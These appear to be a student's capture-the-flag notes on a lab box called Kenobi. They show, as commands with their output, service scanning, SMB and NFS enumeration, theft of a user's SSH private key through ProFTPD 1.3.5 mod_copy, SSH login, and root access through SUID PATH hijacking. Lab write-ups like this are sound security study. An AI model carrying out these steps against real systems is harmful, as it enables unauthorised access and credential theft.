nmap -sV 10.48.172.194

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

─$ ls -al /usr/share/nmap/scripts  - this cmd gives all nmap scripts 
 ls -al /usr/share/nmap/scripts | grep smb

smbclient -L [//10.48.172.194](https://10.48.172.194/) -N
smbclient [//10.48.172.194/anonymous](https://10.48.172.194/anonymous) -N

more log.txt

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.172.194

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions

└─$ searchsploit proftpd  1.3.5

---

Exploit Title                                                       |  Path

---

ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)            | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                  | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)              | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                            | linux/remote/36742.txt

nc 10.48.156.59 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.48.156.59]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

sudo mkdir /mnt/KenobiNFS 

 sudo mount 10.48.156.59:/var /mnt/KenobiNFS
ls -al /mnt/KenobiNFS
 ls -al /mnt/KenobiNFS/tmp
 sudo cp /mnt/KenobiNFS/tmp/id_rsa

sudo chmod 600 id_rsa  

sudo ssh -i id_rsa [kenobi@10.48.156.59](mailto:kenobi@10.48.156.59)

ls
share  user.txt

cat user.txt
d0b0f3f53b6caa532a83915e19224899

 find / -perm -u=s -type f 2>/dev/null
/usr/bin/menu

 /usr/bin/menu

1. status check
2. kernel version
3. ifconfig

kenobi@kenobi:~$ cd /tmp/
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

---

1. status check
2. kernel version
3. ifconfig
** Enter your choice :1

id 

whoami

root 

cd /root

cat root.txt

177b3cd8562289f37382721c28381f02

---
